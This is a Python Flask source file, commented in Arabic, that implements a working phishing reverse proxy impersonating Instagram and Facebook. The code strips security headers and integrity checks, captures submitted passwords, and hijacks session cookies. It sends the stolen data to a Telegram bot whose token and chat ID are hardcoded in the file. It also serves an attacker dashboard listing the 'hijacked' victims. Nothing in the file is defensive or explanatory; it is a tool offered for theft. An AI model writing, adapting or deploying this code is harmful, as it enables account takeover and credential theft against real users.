from flask import Flask, request, make_response, redirect, url_for, render_template_string
import requests
import logging
import json
from datetime import datetime
import os
import urllib3
import re
from urllib.parse import urljoin, urlparse

# إعدادات الحماية والتحذيرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(64).hex())

# إعداد السجلات الاحترافية
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')

# إعدادات التلجرام (تأكد من ضبطها في Render)
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')

# قواعد بيانات مؤقتة
sessions_db = {}
creds_db = {}

class UltimateEngineV2:
    def __init__(self):
        self.target = 'www.instagram.com'
        self.proxy_domains = [
            'www.instagram.com', 'instagram.com', 'i.instagram.com',
            'static.cdninstagram.com', 'scontent.cdninstagram.com',
            'www.facebook.com', 'facebook.com', 'connect.facebook.net'
        ]
        self.critical_cookies = ['sessionid', 'ds_user_id', 'csrftoken']

    def notify_telegram(self, msg):
        try:
            for i in range(0, len(msg), 4000):
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                             json={'chat_id': CHAT_ID, 'text': msg[i:i+4000], 'parse_mode': 'HTML'}, timeout=10)
        except Exception as e:
            logging.error(f"Telegram Error: {e}")

    def capture_full_session(self, cookies, ip, host):
        c_dict = requests.utils.dict_from_cookiejar(cookies)
        if any(c in c_dict for c in self.critical_cookies):
            sid = datetime.now().strftime("%y%m%d_%H%M%S")
            sessions_db[sid] = {'cookies': c_dict, 'ip': ip, 'time': str(datetime.now())}
            
            cookie_str = "\n".join([f"<b>{k}</b>: <code>{v}</code>" for k, v in c_dict.items()])
            alert = (f"🔥 <b>[VICTIM HIJACKED]</b>\n🆔 ID: <code>{sid}</code>\n🌐 IP: <code>{ip}</code>\n"
                    f"🍪 <b>FULL COOKIES:</b>\n{cookie_str}\n🔗 Admin: https://{host}/admin/dashboard")
            self.notify_telegram(alert)
            return True
        return False

    def process_content(self, content, c_type, host):
        c_type = str(c_type).lower()
        if any(ext in c_type for ext in ['html', 'javascript', 'json', 'css']):
            try:
                text = content.decode('utf-8', errors='ignore')
                
                # استبدال النطاقات بذكاء فائق
                for d in self.proxy_domains:
                    text = text.replace(f"https://{d}", f"https://{host}")
                    text = text.replace(f"//{d}", f"//{host}")
                    text = text.replace(f'"{d}"', f'"{host}"')
                    text = text.replace(f"'{d}'", f"'{host}'")
                    text = text.replace(d, host)
                
                # كسر حماية SRI و CSP و Frame
                text = re.sub(r'integrity="[^"]+"', '', text) 
                text = text.replace('Content-Security-Policy', 'X-Ignored-CSP')
                text = text.replace('frame-ancestors', 'none-disabled')
                
                # خداع ملفات الـ JS داخل المتصفح
                text = text.replace('window.location.host', f"'{host}'")
                text = text.replace('window.location.hostname', f"'{host}'")
                
                return text.encode('utf-8')
            except: return content
        return content

engine = UltimateEngineV2()

@app.route('/admin/dashboard')
def dashboard():
    template = """
    <html><head><title>MASTER PANEL</title><style>
    body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:30px;}
    .card{border:1px solid #00ff00;padding:15px;margin:10px 0;background:#111;}
    pre{color:#00ffff;white-space:pre-wrap;word-break:break-all;}
    </style></head><body>
    <h1>[ SYSTEM STATUS: ACTIVE ]</h1>
    <h3>SESSIONS: {{ s_len }} | CREDS: {{ c_len }}</h3>
    {% for id, s in sessions.items() %}
    <div class="card"><b>ID: {{ id }}</b> [{{ s.time }}] - IP: {{ s.ip }}<br><pre>{{ s.cookies | tojson(indent=2) }}</pre></div>
    {% endfor %}
    <br><a href="/admin/clear" style="color:red">WIPE ALL DATA</a>
    </body></html>
    """
    return render_template_string(template, sessions=sessions_db, s_len=len(sessions_db), c_len=len(creds_db))

@app.route('/admin/clear')
def clear():
    sessions_db.clear()
    return redirect('/admin/dashboard')

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def master_proxy(path):
    host = request.headers.get('Host', '').split(':')[0]
    target_domain = engine.target
    target_url = urljoin(f"https://{target_domain}", path)
    if request.query_string:
        target_url += '?' + request.query_string.decode('utf-8')

    # منع الضغط نهائياً لضمان قراءة البيانات وحل مشكلة الرموز المشوهة
    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']}
    headers['Host'] = target_domain
    headers['Referer'] = f"https://{target_domain}/"

    # التقاط بيانات الـ POST (كلمات المرور)
    if request.method == 'POST':
        try:
            data = request.form.to_dict() or request.get_json(silent=True) or {}
            if data:
                cid = datetime.now().strftime("%H%M%S")
                creds_db[cid] = data
                engine.notify_telegram(f"🔐 <b>[LOGIN DATA]</b>\nIP: <code>{request.remote_addr}</code>\n<pre>{json.dumps(data, indent=2, ensure_ascii=False)}</pre>")
        except: pass

    try:
        resp = requests.request(
            method=request.method, url=target_url, headers=headers,
            cookies=request.cookies, data=request.get_data(),
            allow_redirects=False, verify=False, timeout=25
        )

        # معالجة المحتوى والحماية (كسر SRI و CSP)
        processed_body = engine.process_content(resp.content, resp.headers.get('Content-Type', ''), host)
        
        proxy_resp = make_response(processed_body)
        proxy_resp.status_code = resp.status_code

        # تصفية الرؤوس الأمنية الصارمة
        excluded_headers = [
            'content-encoding', 'content-length', 'transfer-encoding', 
            'content-security-policy', 'x-frame-options', 'strict-transport-security',
            'alternate-protocol', 'alt-svc'
        ]
        for k, v in resp.headers.items():
            if k.lower() not in excluded_headers:
                proxy_resp.headers[k] = v

        # تثبيت الكوكيز على نطاقك
        for c_name, c_value in resp.cookies.items():
            proxy_resp.set_cookie(c_name, c_value, domain=host, secure=True, httponly=True, samesite='Lax')

        # خطف الجلسة إذا اكتمل الدخول
        if resp.cookies:
            engine.capture_full_session(resp.cookies, request.remote_addr, host)

        # معالجة التوجيه (Redirect)
        if resp.status_code in [301, 302, 303, 307, 308]:
            loc = resp.headers.get('Location', '')
            for d in engine.proxy_domains:
                if d in loc:
                    proxy_resp.headers['Location'] = loc.replace(d, host)
                    break

        return proxy_resp

    except Exception as e:
        logging.error(f"FATAL: {e}")
        return "SERVICE BUSY", 503

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
